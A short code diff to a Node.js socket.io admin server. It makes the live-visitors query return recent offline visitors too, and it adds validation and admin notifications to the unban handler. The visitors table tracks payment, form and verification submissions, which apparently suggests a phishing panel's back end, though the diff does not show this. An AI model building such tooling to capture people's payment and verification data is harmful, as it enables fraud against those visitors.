@@ -312,7 +312,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Handle live visitors request
+  // Handle live visitors request (جلب جميع الزوار حتى غير المتصلين)
   socket.on('visitors:request', async () => {
     try {
       const visitors = await pool.query(`
@@ -320,8 +320,8 @@ io.on('connection', (socket) => {
                verification_data, form_submitted, payment_submitted, 
                verification_submitted, last_activity, is_online
         FROM visitors 
-        WHERE is_online = true
         ORDER BY last_activity DESC
+        LIMIT 100
       `);
 
       socket.emit('visitors:update', { visitors: visitors.rows });
@@ -360,11 +360,23 @@ io.on('connection', (socket) => {
   // Handle unban request
   socket.on('user:unban', async (data) => {
     try {
-      const { id } = data;
-      await pool.query('DELETE FROM banned_users WHERE id = $1', [id]);
-      console.log(`✅ User unbanned: ${id}`);
+      const { banId } = data;
+      if (!banId) return;
+      
+      await pool.query('DELETE FROM banned_users WHERE id = $1', [banId]);
+      
+      // Send success response to the admin who requested
+      socket.emit('user:unbanned', { banId, success: true });
+      
+      // Notify all admins to refresh their lists
+      adminConnections.forEach((adminSocket) => {
+        adminSocket.emit('ban:listUpdate');
+      });
+      
+      console.log(`✅ User unbanned: ID ${banId}`);
     } catch (error) {
       console.error('Error unbanning user:', error);
+      socket.emit('user:unbanned', { success: false, message: error.message });
     }
   });
 
